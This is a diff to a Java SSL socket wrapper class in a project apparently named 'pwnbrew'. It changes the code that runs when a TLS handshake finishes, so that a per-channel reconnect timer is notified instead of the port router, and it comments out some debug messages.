@@ -56,8 +56,12 @@ import javax.net.ssl.SSLEngineResult.Status;
 import javax.net.ssl.SSLException;
 import javax.net.ssl.SSLParameters;
 import pwnbrew.ClientConfig;
+import pwnbrew.manager.ConnectionManager;
+import pwnbrew.manager.OutgoingConnectionManager;
+import pwnbrew.network.PortRouter;
 import pwnbrew.utilities.Constants;
 import pwnbrew.utilities.DebugPrinter;
+import pwnbrew.utilities.ReconnectTimer;
 
 /**
  * A helper class which performs I/O using the SSLEngine API.
@@ -532,7 +536,14 @@ public class SecureSocketChannelWrapper extends SocketChannelWrapper {
 
             //Notify the comm
             theSocketHandler.setState( Constants.CONNECTED);
-            theSocketHandler.getPortRouter().beNotified(theSocketHandler.getChannelId());           
+//            theSocketHandler.getPortRouter().beNotified(theSocketHandler.getChannelId());    
+            PortRouter aPR = theSocketHandler.getPortRouter();
+            ConnectionManager aCM = aPR.getConnectionManager();
+            if(aCM instanceof OutgoingConnectionManager){
+                OutgoingConnectionManager theOCM = (OutgoingConnectionManager)aCM;
+                ReconnectTimer aRT = theOCM.getReconnectTimer(theSocketHandler.getChannelId());
+                aRT.beNotified();   
+            }  
 
             return;
         }
@@ -592,14 +603,21 @@ public class SecureSocketChannelWrapper extends SocketChannelWrapper {
 
                     case FINISHED:
                         initialHSComplete = true;
-                        DebugPrinter.printMessage( this.getClass().getSimpleName(), "Finished handshaking 2.");
+                        //DebugPrinter.printMessage( this.getClass().getSimpleName(), "Finished handshaking 2.");
 
                         
                         //Notify the comm
                         theSocketHandler.setState( Constants.CONNECTED);
                         //DebugPrinter.printMessage( this.getClass().getSimpleName(), "Set state.");
 
-                        theSocketHandler.getPortRouter().beNotified(theSocketHandler.getChannelId()); 
+//                        theSocketHandler.getPortRouter().beNotified(theSocketHandler.getChannelId());
+                        PortRouter aPR = theSocketHandler.getPortRouter();
+                        ConnectionManager aCM = aPR.getConnectionManager();
+                        if(aCM instanceof OutgoingConnectionManager){
+                            OutgoingConnectionManager theOCM = (OutgoingConnectionManager)aCM;
+                            ReconnectTimer aRT = theOCM.getReconnectTimer(theSocketHandler.getChannelId());
+                            aRT.beNotified();   
+                        }  
                         //DebugPrinter.printMessage( this.getClass().getSimpleName(), "Notified.");
 //                        thePortRouter.connectionCompleted(theSocketChannel, true, true);
                         
@@ -663,11 +681,18 @@ public class SecureSocketChannelWrapper extends SocketChannelWrapper {
                     
                 case FINISHED:
                     initialHSComplete = true;
-                    DebugPrinter.printMessage( this.getClass().getSimpleName(), "Finished handshaking 3.");
+                    //DebugPrinter.printMessage( this.getClass().getSimpleName(), "Finished handshaking 3.");
 
                     //Notify the comm
                     theSocketHandler.setState( Constants.CONNECTED);
-                    theSocketHandler.getPortRouter().beNotified(theSocketHandler.getChannelId()); 
+                    PortRouter aPR = theSocketHandler.getPortRouter();
+                    ConnectionManager aCM = aPR.getConnectionManager();
+                    if(aCM instanceof OutgoingConnectionManager){
+                        OutgoingConnectionManager theOCM = (OutgoingConnectionManager)aCM;
+                        ReconnectTimer aRT = theOCM.getReconnectTimer(theSocketHandler.getChannelId());
+                        aRT.beNotified();   
+                    }  
+//                    theSocketHandler.getPortRouter().beNotified(theSocketHandler.getChannelId()); 
 //                    thePortRouter.connectionCompleted(theSocketChannel, true, true);                                        
                     break;
                     
